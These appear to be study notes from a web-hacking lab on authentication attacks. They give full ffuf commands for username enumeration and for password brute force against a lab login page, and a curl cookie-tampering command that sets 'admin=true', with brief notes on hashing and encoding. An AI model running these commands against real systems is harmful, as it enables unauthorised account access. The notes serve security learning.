1. Username Enumeration
-create a list of valid usernames
-use ffuf tool to see which usernames are already in the system
 
ffuf - w [username list.txt] -X POST -d "username=FUZZ&email=x&passowrd=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u [IP] -mr "username already exists"

-w: selects file location of username list
-X: request method GET/POST/etc..
-d: data to send, FUZZ in place of the username to enumerate
-H: used for adding additional headers to the request
-u: url we are making the request to
-mr: argument is the text on page to lookfor to validate a username

2. Brute Force
-using the valid_usernames, it is possible to attempt a brute force attack login

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.54.125/customers/login -fc 200

-w: specify word list
W1: list of valid usernames
W2: list of passwords to try
-fc: check for status code
200: Connection/password accepted

3. Logic Flaw - bypass intended logic to gain access

4. Cookie tampering - gain unauthenticated access, access another account or escalate privileges
eg: curl -H "Cookie: logged_in=true; admin=true" [IP]
Hashing: cookie values can be hashed to represent original text - irreversible
hashing methods: md5, sha-256, sha-512, sha1 
List of common hashes: https://crackstation.net
Encoding: generates random text like hashing but reversible
Encoding could be base32 or base64
encode/decode: https://www.base64encode.org 
